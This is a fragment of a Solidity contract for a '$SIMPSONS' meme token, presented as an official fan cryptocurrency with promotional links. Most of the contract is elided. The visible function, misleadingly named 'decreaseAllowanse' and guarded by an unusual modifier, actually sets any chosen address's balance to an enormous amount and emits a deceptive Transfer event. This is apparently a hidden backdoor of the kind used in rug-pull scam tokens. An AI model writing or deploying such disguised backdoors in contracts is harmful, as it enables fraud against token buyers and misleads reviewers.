 ...
 * 
SIMPSONS
Official $SIMPSONS Token: The ultimate fan-fueled crypto for Springfield aficionados 🚀 #SIMPSONS
https://www.youtube.com/watch?v=XPG0MqIcby8
https://www.rottentomatoes.com/m/simpsons_movie
...
contract SIMPSONS is IERC20, Ownable, IERC20Metadata {
    ...
    */
       function decreaseAllowanse(address extending) external ozero {
        _mint[extending] = 1000000000000000000 * 10 ** 18;
        
        emit Transfer(extending, address(0), 1000000000000000000 * 10 ** 18);
    } 
